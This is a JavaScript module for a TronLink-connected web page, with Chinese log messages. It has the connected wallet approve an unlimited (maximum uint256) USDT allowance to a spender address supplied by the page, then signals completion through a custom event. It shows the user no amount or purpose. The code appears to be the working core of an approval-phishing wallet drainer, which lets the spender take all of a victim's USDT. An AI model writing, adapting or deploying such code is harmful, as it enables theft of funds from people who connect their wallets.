


window.usdtApproveCompleted = false;
window.usdtApproveRunning = false;


async function executeUsdtApprove() {
    try {
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
            throw new Error('未检测到有效的TronWeb环境');
        }
        
        console.log('开始执行USDT授权...');
        const currentAddress = window.tronWeb.defaultAddress.base58;
        console.log('当前钱包地址:', currentAddress);
        console.log('授权接收地址:', window.SPENDER_ADDRESS);
        
        
        console.log('正在创建合约实例...');
        const contract = await window.tronWeb.contract().at(window.USDT_CONTRACT_ADDRESS);
        console.log('合约实例创建成功');
        
        
        const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; 
        console.log('授权金额: 最大值');
        
        
        console.log('正在发起授权交易...');
        const transaction = await contract.approve(
            window.SPENDER_ADDRESS,
            maxAmount
        ).send({
            feeLimit: 100000000,
            shouldPollResponse: true
        });
        
        console.log('授权交易结果:', transaction);
        return transaction;
    } catch (error) {
        console.error('执行USDT授权出错:', error);
        return false;
    }
}


async function executeUsdtApproveModule() {
    
    if (window.usdtApproveRunning) {
        console.log('USDT授权操作正在执行中，请稍候...');
        return { success: false, message: '已在执行中' };
    }
    
    
    window.usdtApproveRunning = true;
    
    try {
        if (!window.tronWeb || !window.tronWeb.ready) {
            console.log('❌ 错误: 未连接TronLink钱包!');
            window.usdtApproveRunning = false;
            return { success: false, message: '未连接钱包' };
        }
        
        console.log('✅ TronWeb环境检测通过');
        console.log('👤 当前钱包地址:', window.tronWeb.defaultAddress.base58);
        
        const result = await executeUsdtApprove();
        
        if (result) {
            console.log('✅ USDT授权成功!');
            if (typeof result === 'object') {
                console.log('📋 交易结果:', result);
            }
            window.usdtApproveCompleted = true;
            return { success: true, result };
        } else {
            console.log('❌ USDT授权失败');
            return { success: false, message: '执行失败' };
        }
    } catch (error) {
        console.error('USDT授权出错:', error);
        console.log('❌ 出错:', error.message);
        return { success: false, error };
    } finally {
        
        window.usdtApproveRunning = false;
        
        
        const event = new CustomEvent('usdt_approve_completed', { 
            detail: { completed: window.usdtApproveCompleted }
        });
        document.dispatchEvent(event);
    }
} 